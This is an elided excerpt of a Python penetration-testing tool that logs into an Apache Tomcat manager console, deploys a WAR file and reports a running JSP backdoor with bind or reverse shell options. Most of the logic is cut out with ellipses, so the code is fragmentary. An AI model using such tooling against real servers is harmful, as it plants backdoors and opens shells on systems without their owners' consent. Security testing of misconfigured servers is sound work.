...
def deployApplication(browser, url, appname, warpath, modify_action=False):
	...
	for form in browser.forms():
		...
		if action_url and action_function:
			browser.form = form
			if modify_action:
				logger.debug('Adjusting upload form action to conform custom manager\'s URL')
	...
	if not modify_action:
		logger.debug('Could not locate proper upload form. Will try adjusting form action.')
...
def browseToManager(host, url, user, password):
	...
	logger.debug('Browsing to "%s"... Creds: "%s:%s"' % (baseurl, user, password))
...
Penetration Testing utility aiming at presenting danger of leaving Tomcat misconfigured.
	...
	conn.add_option('-u', '--url', metavar='URL', dest='url', default='', help='Apache Tomcat management console URL. Default: empty')
	...
	payload.add_option('-R', '--remove', metavar='APPNAME', default=False, action='store_true', dest='remove_appname', help='Remove deployed app with specified name. Can be used for post-assessment cleaning')
	...
	if (opts.host and not opts.port):
		...
		logger.info('Bind shell will be deployed on: %s:%s' % (host, opts.port))
	...
	if opts.file and not os.path.exists(file):
        ...
        if opts.remove_appname and not opts.appname:
                logger.error('Told to remove WAR application but not specified its name')
                sys.exit(0)
...
def main():
	...
	if not opts.generate:
		url = ''
		try:
			browser, url = browseToManager(args[0], opts.url, opts.user, opts.password)
		except KeyboardInterrupt:
	...
	try:
		...
		if not opts.remove_appname:
			mode = chooseShellFunctionality(opts)
                        if mode == 0:
                            logger.warning('You have not specified neither bind nor reverse shell parameres (RHOST and PORT)\n\tGiving you 3 seconds to interrupt the script and modify parameters or proceeding.')
                            time.sleep(3)
		...
		if checkIsDeployed(browser, url, appname):
			if opts.remove_appname:
				logging.info("Removing previously deployed WAR application with name: '%s'" % opts.appname)
		...
		if deployed:
			...
			if invokeApplication(browser, constructBaseUrl(args[0], opts.url), opts):
				logger.info("\033[0;32mJSP Backdoor up & running on %s/\033[1;0m" % os.path.join(constructBaseUrl(args[0], opts.url), opts.appname))
				...
				if mode == 0:
					logger.warning('No direct shell functionality was requested (neither bind nor reverse).')
			else:
